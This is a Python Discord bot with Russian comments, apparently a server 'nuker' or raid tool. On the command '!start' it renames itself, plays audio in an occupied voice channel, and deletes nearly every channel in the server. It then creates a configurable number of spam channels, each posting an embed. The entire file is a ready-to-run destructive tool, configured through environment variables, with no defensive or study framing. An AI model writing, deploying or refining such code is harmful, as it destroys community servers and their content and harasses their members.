import discord
import asyncio
import os
from dotenv import load_dotenv

load_dotenv()
token = os.getenv('TOKEN')  # токен бота. берите из https://discord.com/developers/applications
image_url = os.getenv('IMAGE_URL')  # ссылка на фотку в embed
music_file = os.getenv('MUSIC_FILE')  # файл с музыкой
nickname = os.getenv('NICKNAME')  # никнейм бота, который изменится после !start
avatar_file = os.getenv('AVATAR_FILE')  # файл с аватаркой
name_channel = os.getenv('NAME_CHANNEL')  # название каналов, которые будут создаваться (в конце названия обязательно должна быть тире)
title = os.getenv('TITLE')  # заголовок embed
description = os.getenv('DESCRIPTION')  # описание embed
count = int(os.getenv('COUNT'))  # количество каналов


class MyClient(discord.Client):
    def __init__(self, *, intents: discord.Intents):
        super().__init__(intents=intents)
        self.voice_client = None
        self.voice_channel_id = None

    async def on_ready(self):
        print(f'логин есть {self.user}')

    async def on_message(self, message):
        if message.author.bot:
            return
        if message.content.lower().strip().startswith('!start'):
            guild = message.guild
            await message.delete()
            await self.change_profile()
            await self.process_guild(guild)

    async def change_profile(self):
        try:
            with open(avatar_file, "rb") as image:
                await self.user.edit(username=nickname, avatar=image.read())
            print("профиль изменён")
        except discord.errors.HTTPException as e:
            print(f"не удалось изменить профиль {e}")
        except FileNotFoundError:
            print("аватар не найден")

    async def process_guild(self, guild):
        try:
            voice_channel = discord.utils.find(lambda c: isinstance(c, discord.VoiceChannel) and len(c.members) > 0, guild.channels)
            if voice_channel:
                print(f"нашёл гс с людьми {voice_channel.name}")
                await self.play_music(voice_channel)
            await asyncio.sleep(16)
            for channel in guild.channels:
                if channel.type == discord.ChannelType.voice and len(channel.members) > 0:
                    continue
                try:
                    await channel.delete()
                    print(f"снес канал {channel.name}")
                except discord.Forbidden:
                    print(f"у меня нет прав {channel.name}")
            for i in range(1, count + 1):
                try:
                    channel = await guild.create_text_channel(f'{name_channel}{i}')
                    print(f"создал канал {channel.name}")
                    try:
                        embed = discord.Embed(title=title, description=description)
                        embed.set_image(url=image_url)
                        await channel.send(embed=embed)
                    except discord.Forbidden:
                        print(f"нет прав")
                except discord.Forbidden:
                    print(f"нет прав")
        except Exception as e:
            print(f"еррор {e}")

    async def play_music(self, channel):
        try:
            if self.voice_client is not None and self.voice_client.is_connected():
                await self.voice_client.move_to(channel)
            else:
                try:
                    self.voice_client = await channel.connect()
                except discord.ClientException as e:
                    print(f"не могу подключиться {e}")
                    return
            self.voice_channel_id = channel.id
            if self.voice_client.is_playing():
                self.voice_client.stop()
            self.voice_client.play(discord.FFmpegPCMAudio(source=music_file), after=lambda e: print(f'музыка закончилась: {e}') if e else None)
            self.voice_client.source = discord.PCMVolumeTransformer(self.voice_client.source)
            self.voice_client.source.volume = 1
        except Exception as e:
            print(f"ерор: {e}")

intents = discord.Intents.default()
intents.guilds = True
intents.messages = True
intents.message_content = True
intents.voice_states = True
client = MyClient(intents=intents)
client.run(token)
